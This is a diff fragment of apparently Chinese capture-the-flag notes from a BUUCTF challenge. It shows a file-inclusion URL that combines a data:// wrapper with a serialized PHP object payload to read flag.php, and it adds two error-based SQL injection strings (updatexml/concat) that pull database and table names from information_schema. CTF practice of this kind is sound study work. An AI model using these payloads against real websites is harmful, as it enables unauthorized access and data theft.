@@ -376,3 +376,6 @@ echo serialize($a);
 `[a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}](http://a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;})`
 查看源码，拿到flag。
 关于===php伪协议===：[[【精选】文件包含支持的伪协议_data伪协议-CSDN博客.pdf]]
+
+1'or(updatexml(1,concat(0x7e,database()),1))#
+1'or(updatexml(1,concat(0x7e,select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),1))#
